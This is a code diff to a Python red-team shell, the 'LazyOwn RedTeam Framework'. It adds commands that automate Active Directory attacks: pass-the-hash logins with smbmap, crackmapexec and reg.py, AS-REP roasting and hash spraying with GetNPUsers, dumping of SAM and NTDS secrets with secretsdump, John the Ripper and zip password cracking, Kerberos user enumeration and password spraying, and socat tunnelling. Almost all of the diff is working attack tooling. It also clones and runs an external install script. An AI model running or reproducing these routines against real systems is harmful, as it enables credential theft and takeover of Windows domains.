@@ -90,6 +90,7 @@ class LazyOwnShell(cmd2.Cmd):
         "ls": "list",
         "nmap": "run lazynmap",
         "now": "clock",
+        "notes": "sh nano sessions/notes.txt",
         "p": "payload",
         "pass": "sh head -c 100 /dev/urandom | base64 | head -c 12 | xclip -sel clip",
         "poison": "run lazylogpoisoning",
@@ -2370,14 +2371,25 @@ class LazyOwnShell(cmd2.Cmd):
                 print_msg(f"Try... smbmap -H {rhost} -u 'deefbeef'")
                 os.system(f"smbmap -H {rhost} -u 'deefbeef'")
                 return
+            else:
+                if line.startswith("hash"):
+                    username = input("    [!] Enter a valid username (default: henry.vinson): ") or 'henry.vinson'
+                    domain = input(f"    [!] Enter a valid domain (default: {domain}): ") or domain
+                    rhost = input(f"    [!] Enter a valid host (default: {rhost}): ") or rhost
+                    hashis = get_hash()
 
-            print_msg(f"Try... smbmap -H {rhost} -R {line}")
-            os.system(f"smbmap -H {rhost} -R {line}")
-            print_msg(
-                f'exploit smb if is posible mount -t cifs -o rw,username=guest,password= "//{rhost}/documents" /mnt/smb '
-            )
-            print_msg('find /mnt/smb -type d -exec sh -c \'touch "$0/x" 2>/dev/null && echo "$0 is writable" && rm "$0/x"\' {} \;')
-            return
+                    command = f"smbmap -u {username} -d {domain} -p '{hashis}' -H {rhost}"    
+                    print_msg(command)
+                    os.system(command)
+                    return
+                else:
+                    print_msg(f"Try... smbmap -H {rhost} -R {line}")
+                    os.system(f"smbmap -H {rhost} -R {line}")
+                    print_msg(
+                        f'exploit smb if is posible mount -t cifs -o rw,username=guest,password= "//{rhost}/documents" /mnt/smb '
+                    )
+                    print_msg('find /mnt/smb -type d -exec sh -c \'touch "$0/x" 2>/dev/null && echo "$0 is writable" && rm "$0/x"\' {} \;')
+                    return
         else:
             path_cred = get_credentials(True)
             try:
@@ -2456,13 +2468,29 @@ class LazyOwnShell(cmd2.Cmd):
        
         rhost = self.params["rhost"]
         domain = self.params["domain"]
-        users = get_users_dic()
-        command = f"GetNPUsers.py {domain}/ -no-pass -usersfile {users} -dc-ip {rhost}"
-        print_msg(command)
-        os.system(command)
-        command = f"sudo impacket-GetNPUsers {domain}/ -no-pass -usersfile {users} -dc-ip {rhost}"
-        print_msg(command)
-        os.system(command)
+        if not line:
+            users = get_users_dic()
+            command = f"GetNPUsers.py {domain}/ -no-pass -usersfile {users} -dc-ip {rhost}"
+            print_msg(command)
+            os.system(command)
+            command = f"sudo impacket-GetNPUsers {domain}/ -no-pass -usersfile {users} -dc-ip {rhost}"
+            print_msg(command)
+            os.system(command)
+        else:
+            if line.startswith("hashs"):
+                hashes = get_users_dic()
+                username = input("   [!] Enter username to sprayhashes (default: admin) ") or 'admin'
+                with open(hashes, 'r') as file:
+                    hashes = file.readlines()
+                    for hash_line in hashes:
+                        hash_line = hash_line.strip()
+                        if hash_line:
+                            command = f'GetNPUsers.py -hashes {hash_line} {domain}/{username} -dc-ip {rhost}'
+                            print_msg(command)
+                            os.system(command)
+                            #choice = input("    [!] Continue ? (y/n)") or "n"
+                            #if choice == "n":
+                            #    return
         return
 
     def do_psexec(self, line):
@@ -3341,10 +3369,28 @@ class LazyOwnShell(cmd2.Cmd):
                         os.system(command)
                         print_warn(f"Done... {command}")
                         return
+                elif line.startswith("hash"):
+                    rhost = self.params["rhost"]
+                    domain = self.params["domain"]
+                    selected_hash_path = get_hash(dir=True)
 
-            print_msg(f"Try... crackmapexec smb {rhost}")
-            os.system(f"crackmapexec smb {rhost}")
-            print_msg(f"Done... crackmapexec smb {rhost}")
+                    if selected_hash_path:
+                        with open(selected_hash_path, "r") as file:
+                            hash_content = file.read().strip()
+                        selected_hash = hash_content.split(":")[1]
+                        username = os.path.basename(selected_hash_path).replace("hash_", "").replace(".txt", "")
+                        if selected_hash:
+                            command = f"cme smb {rhost} -d {domain} -u {username} -H {selected_hash}"
+                            print_msg(f"Executing: {command}")
+                            os.system(command)
+                        else:
+                            print_error("No hash content found. Exiting.")
+                    else:
+                        print_error("No hash file selected. Exiting.")
+            else:
+                print_msg(f"Try... crackmapexec smb {rhost}")
+                os.system(f"crackmapexec smb {rhost}")
+                print_msg(f"Done... crackmapexec smb {rhost}")
         return
 
     def do_ldapdomaindump(self, line):
@@ -7785,14 +7831,25 @@ class LazyOwnShell(cmd2.Cmd):
                 f"You must pass ip:port by argument ex:{GREEN} socat 10.10.10:445  {WHITE} more help: {CYAN} help socat{RESET} "
             )
             return
-        print_msg(
-            f"Try... {MAGENTA}socat TCP-LISTEN:1080,fork SOCKS4A:localhost:{line},socksport=1080{RESET}"
-        )
-        os.system(f"socat TCP-LISTEN:1080,fork SOCKS4A:localhost:{line},socksport=1080")
-        print_msg(
-            f"{YELLOW} Shutdown socat tunnel at sessions in port {RED} 1080 {RESET}"
-        )
-        return
+        else:
+            if line.startswith("fork"):
+                domain = self.params["domain"]
+                port = input("    [!] Enter TCP/port to fork: (default: 445)") or "445"
+                domain = input(f"    [!] Enter TCP/port to fork: (default: {domain})") or domain
+                command = f"sudo socat TCP-LISTEN:{port},fork TCP:apt:{port}"
+                print_msg(f"Starting socat fork at port: {port}")
+                print_msg(command)
+                os.system(command)
+                return
+            else:
+                print_msg(
+                    f"Try... {MAGENTA}socat TCP-LISTEN:1080,fork SOCKS4A:localhost:{line},socksport=1080{RESET}"
+                )
+                os.system(f"socat TCP-LISTEN:1080,fork SOCKS4A:localhost:{line},socksport=1080")
+                print_msg(
+                    f"{YELLOW} Shutdown socat tunnel at sessions in port {RED} 1080 {RESET}"
+                )
+                return
 
     def do_chisel(self, line):
         """
@@ -10237,7 +10294,7 @@ class LazyOwnShell(cmd2.Cmd):
         path = os.getcwd()
         users_txt = get_users_dic()
         domain = self.params["domain"]
-        
+        subdomain = self.params["subdomain"]
         if not check_rhost(rhost):
             return
 
@@ -10268,7 +10325,12 @@ class LazyOwnShell(cmd2.Cmd):
                     print_msg(command)
                     os.system(command)                
         else:
-            command = f"kerbrute_linux_amd64 userenum --dc {rhost} -d {domain} -t 20 -v {users_txt} "
+            choice_dc = input("    [!] Do you wanna use dc option ? (y/n): ") or "n"
+            if choice_dc == "y":
+                dc = f" --dc {subdomain} "
+            else:
+                dc= ""
+            command = f"kerbrute_linux_amd64 userenum --dc {rhost} -d {domain} {dc} -t 20 -v {users_txt} "
             print_msg(command)
             os.system(command)
             choice = input("Extend with larger dic ? (y/n)") or 'y'
@@ -11834,42 +11896,54 @@ class LazyOwnShell(cmd2.Cmd):
         dominio = get_domain(url)
 
         path_cred = "sessions/credentials.txt"        
-       
-        if not os.path.exists(path_cred):
+        if line:
+            if line.startswith("sam"):
+                if os.path.exists("sessions/SYSTEM"):
+                    hashs = "sessions/hashs.txt"
+                    cleanned = "sessions/hashs_cleaned.txt"
+                    command = f"secretsdump.py -system sessions/SYSTEM -sam sessions/SAM LOCAL -outputfile {hashs}"
+                    print_msg(f"Executing command: {command}")
+                    os.system(command)
+                    os.system(f"nano {hashs}.sam")
+                    os.system(f"cat {hashs}.sam")
+                    command = f"sudo john --fork=4 --format=nt {hashs}.sam --wordlist={wordlist}"
+                    print_msg(command)
+                    os.system(command)
+                    os.system(f"sudo john {hashs}.sam --show")
+                    return
+                else:
+                    print_error("You need credentials.txt or SAM and SYSTEM files")
+        
+            elif line.startswith("creds"):
+                with open(path_cred, "r") as file:
+                    for file_line in file:
+                        params = file_line.split(":")
+                        username = params[0]
+                        password = params[1].replace("\n", "")
+                        domain = input(f"    [!] Domain: (default: {dominio})").strip() or dominio
+                        ip_address = input(f"    [!] IP Address: (default: {rhost})").strip() or rhost
+                        command = f"secretsdump.py {domain}/{username}:{password}@{ip_address}"
+                        print_msg(f"Executing command: {command}")
 
-            if os.path.exists("sessions/SYSTEM"):
-                hashs = "sessions/hashs.txt"
-                cleanned = "sessions/hashs_cleaned.txt"
-                command = f"secretsdump.py -system sessions/SYSTEM -sam sessions/SAM LOCAL -outputfile {hashs}"
-                print_msg(f"Executing command: {command}")
-                os.system(command)
-                os.system(f"nano {hashs}.sam")
-                os.system(f"cat {hashs}.sam")
-                command = f"sudo john --fork=4 --format=nt {hashs}.sam --wordlist={wordlist}"
+                        os.system(command)
+                        return
+            elif line.startswith("system"):
+
+                commands = "cd sessions && secretsdump.py local -system registry/SYSTEM -security registry/SECURITY -ntds Active\ Directory/ntds.dit -outputfile hashes"
+
+                print_msg(commands)
+                os.system(commands)
+
+                command = "cd sessions && cut -d ':' -f 4 hashes.ntds > hashes.txt"
+
                 print_msg(command)
                 os.system(command)
-                os.system(f"sudo john {hashs}.sam --show")
+
+                command = "cd sessions && awk -F ':' '{print $3 \":\" $4}' hashes.ntds > hashes2.txt"
+
+                print_msg(command)
+                os.system(command)
                 return
-            else:
-                print_error("You need credentials.txt or SAM and SYSTEM files")
-        else:
-            with open(path_cred, "r") as file:
-                for file_line in file:
-                    params = file_line.split(":")
-                    if not line:
-                        username = params[0]
-                    else:
-                        username = line
-                    password = params[1].replace("\n", "")
-
-        domain = input(f"    [!] Domain: (default: {dominio})").strip() or dominio
-        ip_address = input(f"    [!] IP Address: (default: {rhost})").strip() or rhost
-
-        command = f"secretsdump.py {domain}/{username}:{password}@{ip_address}"
-        print_msg(f"Executing command: {command}")
-
-        os.system(command)
-
         return
 
     def do_getuserspns(self, line):
@@ -14906,44 +14980,6 @@ class LazyOwnShell(cmd2.Cmd):
         os.system(command)
         return
 
-    def do_v(self, arg):
-        """
-        Open a new window within a tmux session using the LazyOwn RedTeam Framework.
-
-        This method is designed to create a new vertical split window in an existing
-        tmux session, where the specified command will be executed. The command
-        used to open the new window is the `./run --no-banner` script, which is
-        intended for use within the LazyOwn RedTeam Framework environment.
-
-        The method first ensures that the specified tmux session is active by calling
-        the `ensure_tmux_session` function. If the session is not already running,
-        it will create a new one. After confirming that the session is active, it
-        proceeds to create a new vertical window with a specified size. The size of
-        the new window is currently set to 50% of the available terminal space.
-
-        Args:
-            arg (str): Additional arguments passed to the command, if any. This can be
-                        used to customize the behavior of the command executed in the
-                        new window. However, in the current implementation, this
-                        argument is not utilized and can be left as an empty string.
-
-        Example:
-            If this method is called within a command-line interface of the LazyOwn
-            RedTeam Framework, it will open a new vertical tmux window and execute
-            the `./run --no-banner` command within it.
-
-        Note:
-            - Ensure that tmux is installed and properly configured on the system.
-            - The method assumes that the session name is defined and accessible in
-            the scope where this method is called.
-        """
-        ensure_tmux_session(session_name) 
-        size = 50
-        print_msg(f"Open new Windows: {size}")
-        command = f"tmux split-window -v -t {session_name} -p {size} \"bash -c './run --no-banner' C-m\""
-        print_msg(command)
-        subprocess.run(command, shell=True)
-
     def do_h(self, arg):
         """
         Open a new window within a tmux session using the LazyOwn RedTeam Framework.
@@ -14968,6 +15004,44 @@ class LazyOwnShell(cmd2.Cmd):
         Example:
             If this method is called within a command-line interface of the LazyOwn
             RedTeam Framework, it will open a new horizontal tmux window and execute
+            the `./run --no-banner` command within it.
+
+        Note:
+            - Ensure that tmux is installed and properly configured on the system.
+            - The method assumes that the session name is defined and accessible in
+            the scope where this method is called.
+        """
+        ensure_tmux_session(session_name) 
+        size = 50
+        print_msg(f"Open new Windows: {size}")
+        command = f"tmux split-window -v -t {session_name} -p {size} \"bash -c './run --no-banner' C-m\""
+        print_msg(command)
+        subprocess.run(command, shell=True)
+
+    def do_v(self, arg):
+        """
+        Open a new window within a tmux session using the LazyOwn RedTeam Framework.
+
+        This method is designed to create a new vertical split window in an existing
+        tmux session, where the specified command will be executed. The command
+        used to open the new window is the `./run --no-banner` script, which is
+        intended for use within the LazyOwn RedTeam Framework environment.
+
+        The method first ensures that the specified tmux session is active by calling
+        the `ensure_tmux_session` function. If the session is not already running,
+        it will create a new one. After confirming that the session is active, it
+        proceeds to create a new vertical window with a specified size. The size of
+        the new window is currently set to 50% of the available terminal space.
+
+        Args:
+            arg (str): Additional arguments passed to the command, if any. This can be
+                        used to customize the behavior of the command executed in the
+                        new window. However, in the current implementation, this
+                        argument is not utilized and can be left as an empty string.
+
+        Example:
+            If this method is called within a command-line interface of the LazyOwn
+            RedTeam Framework, it will open a new vertical tmux window and execute
             the `./run --no-banner` command within it.
 
         Note:
@@ -15841,6 +15915,287 @@ class LazyOwnShell(cmd2.Cmd):
         
         print_msg(plaintext)
         return
+
+    def do_rpcmap_py(self, line):
+        """
+        Command rpcmap_py: Executes rpcmap.py commands to enumerate MSRPC interfaces.
+
+        This function allows the user to:
+        1. Run rpcmap.py with a specified string binding to discover MSRPC interfaces.
+        2. Filter the output using grep for specific DCOM-related interfaces.
+        3. Optionally run rpcmap.py with additional flags for brute-forcing opnums and adjusting the authentication level.
+
+        Args:
+            line (str): Optional argument specifying the string binding or additional flags for rpcmap.py.
+
+        Returns:
+            None
+
+        Example:
+            rpcmap_py 'ncacn_ip_tcp:10.10.10.213'
+            rpcmap_py 'ncacn_ip_tcp:10.10.10.213' -brute-opnums -auth-level 1 -opnum-max 5
+        """
+        path = os.getcwd()
+        rhost = self.params["rhost"]
+        
+        if not is_binary_present("rpcmap.py"):
+            print_warn("rpcmap.py not found installing...")
+            os.system("sudo apt install impacket -y")
+
+        if not line:
+            command = f"rpcmap.py 'ncacn_ip_tcp:{rhost}'"
+            print_msg(f"Try... {command}")
+            os.system(command)
+            command= f"rpcmap.py 'ncacn_ip_tcp:{rhost}' | grep -A2 'DCOM'"
+            print_msg(f"Try... {command}")
+            os.system(command)
+        else:
+            if line.startswith("brute"):
+                command = f"rpcmap.py 'ncacn_ip_tcp:{rhost}' -brute-opnums -auth-level 1 -opnum-max 5"
+                print_msg(f"Try... {command}")
+                os.system(command)
+
+        
+        print_msg(f"Running RPCMap command: {command}")
+        return
+
+    def do_serveralive2(self, line):
+        """
+        Command serveralive2: Uses Impacket to connect to a remote MSRPC interface and retrieves the server bindings.
+
+        This function allows the user to:
+        1. Establish a connection to a remote MSRPC interface using a specified target from self.params["rhost"].
+        2. Set the authentication level to none.
+        3. Retrieve and print the network addresses from the server bindings using the IObjectExporter.
+
+        Args:
+            line (str): Unused in this context. The target is derived from self.params["rhost"].
+
+        Returns:
+            None
+
+        Example:
+            serveralive2
+        """
+        
+        target = f"ncacn_ip_tcp:{self.params['rhost']}"
+        rpcTransport = transport.DCERPCTransportFactory(target)
+        portmap = rpcTransport.get_dce_rpc()
+        portmap.set_auth_level(RPC_C_AUTHN_LEVEL_NONE)
+        portmap.connect()
+        
+        obj = IObjectExporter(portmap)
+        bindings = obj.ServerAlive2()
+        
+        for binding in bindings:
+            addr = binding['aNetworkAddr']
+            print_msg(f"Address: {addr}")
+        return
+
+    def do_john2zip(self, line):
+        """
+        List all .zip files in the 'sessions' directory, let the user select one, and run the command 
+        `zip2john {selected_file} > sessions/hash.txt`. 
+        Then, run John the Ripper to crack the hash using the RockYou wordlist with multiple forks.
+        
+        Parameters:
+        line (str): An optional string parameter. This can be used for any additional input, though 
+                    it's not needed in this specific command.
+        
+        Returns:
+        None
+        """
+        sessions_dir = 'sessions'
+        path = os.getcwd()
+        output_dir = f"{path}/{sessions_dir}/"
+        zip_files = get_users_dic("zip")
+
+        if not is_binary_present("zip2john"):
+            print_warn("zip2john not found installing...")
+            os.system("sudo apt install zip2john -y")
+
+        if not zip_files:
+            print_error("No .zip files found in the 'sessions' directory.")
+            return
+
+        selected_file = zip_files
+
+        selected_file_path = os.path.join(sessions_dir, selected_file)
+
+        hash_file_path = os.path.join(sessions_dir, 'hash.txt')
+
+        if os.path.exists(hash_file_path):
+            timestamp = time.strftime("%Y%m%d-%H%M%S")
+            backup_hash_file = os.path.join(sessions_dir, f"hash_{timestamp}.txt")
+            os.rename(hash_file_path, backup_hash_file)
+            print_warn(f"Existing hash.txt file backed up as: {backup_hash_file}")
+        
+        command = f"sudo zip2john {selected_file_path} > {hash_file_path}"
+        try:
+            print_msg(command)
+            os.system(command)
+            print_msg(f"Hash saved in: {hash_file_path}")
+        except Exception as e:
+            print_error(f"Error executing command: {str(e)}")
+            return
+
+        wordlist_path = "/usr/share/wordlists/rockyou.txt"
+        john_command = f"sudo john {hash_file_path} -w={wordlist_path} --fork=4"
+        try:
+            print_msg(john_command)
+            os.system(john_command)
+            password = input("    [!] Enter the password cracked(default: admin): ") or "admin"
+            command = f"unzip -P {password} {selected_file_path} -d {output_dir}"
+            print_msg(command)
+            os.system(command)
+
+        except Exception as e:
+            print_error(f"Error executing John the Ripper: {str(e)}")
+
+
+    def do_createusers_and_hashs(self, line):
+        """
+        Command createusers_and_hashs: Extracts usernames and hashes from a dump file.
+
+        This function opens a nano editor for the user to input the contents of a 
+        file in the format:
+        
+            username:UID:LM_HASH:NT_HASH:::
+        
+        Once the data is entered and saved, the function generates:
+        1. A file named `usernames_{rhost}.txt` containing all usernames.
+        2. Individual files named `hash_{username}.txt` for each user, containing 
+        the user's LM and NT hash in the format `LM_HASH:NT_HASH`.
+
+        Args:
+            line (str): Unused parameter, kept for consistency.
+
+        Returns:
+            None
+        """
+        rhost = self.params["rhost"]
+        domain = get_domain(self.params["url"])
+        path = os.getcwd()
+        sessions= f"{path}/sessions"
+        dump_file = f"{sessions}/dump.txt"
+        os.system(f"nano {dump_file}")
+
+        usernames_file = f"{sessions}/usernames_{domain}.txt"
+        with open(dump_file, "r") as dump, open(usernames_file, "w") as users:
+            for line in dump:
+                try:
+                    username, _, lm_hash, nt_hash, *_ = line.strip().split(":")
+                    users.write(f"{username}\n")
+                    with open(f"{sessions}/hash_{username}.txt", "w") as hash_file:
+                        hash_file.write(f"{lm_hash}:{nt_hash}")
+                except ValueError:
+                    continue
+
+        print_msg(f"Usernames saved to {usernames_file}")
+        print_msg("Hashes saved in individual files per user.")
+        return
+
+    def do_pykerbrute(self, line):
+        """
+        Command pykerbrute: Automates the installation and execution of PyKerbrute for bruteforcing Active Directory accounts using Kerberos pre-authentication.
+
+        This function performs the following tasks:
+        1. Clones and installs PyKerbrute if not already installed.
+        2. Allows the user to choose between the EnumADUser.py and ADPwdSpray.py scripts.
+        3. Executes the selected script with user-defined parameters, including domain, mode (TCP/UDP), and selected hash or password.
+
+        Args:
+            line (str): Optional argument for specifying additional parameters for execution, such as domain controller, domain, and attack mode.
+
+        Returns:
+            None
+        """
+
+        pykerbrute_repo = "https://github.com/grisuno/pyKerbrute.git"
+        pykerbrute_dir = os.path.join(os.getcwd(), "external/.exploit/pyKerbrute")
+        export = f" export PYTHONPATH=$PYTHONPATH:{pykerbrute_dir}/_crypto:{pykerbrute_dir}/pyasn1 && "
+        if not os.path.exists(pykerbrute_dir):
+            print_msg("Cloning PyKerbrute repository...")
+            os.system(f"git clone {pykerbrute_repo} {pykerbrute_dir}")
+            print_msg("Installing required dependencies...")
+            os.system(f"cd {pykerbrute_dir} && chmod +x {pykerbrute_dir}/install.sh && {pykerbrute_dir}/install.sh")
+        else:
+            print_msg("PyKerbrute already installed, skipping setup.")
+
+        print_msg("Choose the PyKerbrute attack mode:")
+        print_warn("1. Enumerate valid Active Directory accounts (EnumADUser.py)")
+        print_warn("2. Password spray (ADPwdSpray.py)")
+
+        attack_choice = input("Enter the number of the attack mode you want to use: ").strip()
+
+        if attack_choice == "1":
+            script = "EnumADUser.py"
+        elif attack_choice == "2":
+            script = "ADPwdSpray.py"
+        else:
+            print_warn("Invalid choice. Aborting...")
+            return
+        rhost = self.params["rhost"]
+        domain = self.params["domain"]
+        subdomain = self.params["subdomain"]
+        users_file = 'henry.vinson'
+        domain_controller = input(f"    [?] Enter the Domain Controller address (default '{subdomain}'): ").strip() or subdomain
+        domain = input(f"    [?] Enter the domain name (default '{domain}'): ").strip() or domain
+        user_file = input(f"    [?] Enter the username (default '{users_file}'): ").strip() or users_file
+
+        if script == "ADPwdSpray.py":
+            password_data = get_hash(True)
+            if not password_data:
+                print_error("No password hash selected. Exiting.")
+                return
+            command = f"cd sessions && {export} python2 {pykerbrute_dir}/{script} {domain_controller} {domain} {user_file} {password_data} "
+        else:
+            user_file = get_users_dic()
+            mode_choice = input("    [!] Enter mode: (tcp/udp): ") or 'tcp'
+            command = f"cd sessions && {export} python2 {pykerbrute_dir}/{script} {domain_controller} {domain} {user_file} {mode_choice}"
+
+        print_msg(f"Executing: {command}")
+        os.system(command)
+        return
+
+    def do_reg_py(self, line):
+        """Run reg.py with specified parameters to query the registry.
+
+        :param line: Line input for any additional parameters.
+
+        :returns: None
+
+        Manual execution:
+        To manually run `reg.py`, use the following command:
+
+            reg.py -hashes :<hash> <domain>/<username>@<target> query -keyName <registry_key>
+
+        This function prompts the user for the hash, domain, username, and registry key if they are not already provided.
+        """
+        subdomain = self.params["subdomain"]
+        domain = self.params["domain"]
+        if not is_binary_present("reg.py"):
+            print_warn("reg.py is not installed. Installing.")
+            os.system("sudo apt install impacket -y")
+            return
+
+        hash_value = get_hash()
+        domain = input(f"Enter domain (e.g., {domain}): ") or domain
+        subdomain = input(f"Enter dc domain (e.g., {subdomain}): ") or subdomain
+        username = input("Enter username (e.g., henry.vinson): ") or 'henry.vinson'
+        key_name = input("Enter registry key (e.g., HKU\\\\Software): ") or 'HKU\\\\Software'
+
+        command = f"reg.py -hashes {hash_value} {domain}/{username}@{subdomain} query -keyName {key_name}"
+        
+        print_msg(f"Executing command: {command}")
+        os.system(command)
+        command = f"impacket-reg -hashes {hash_value} {domain}/{username}@{subdomain} query -keyName {key_name}"
+        
+        print_msg(f"Executing command: {command}")
+        os.system(command)
+
+        return
+
 
 if __name__ == "__main__":
     p = LazyOwnShell()
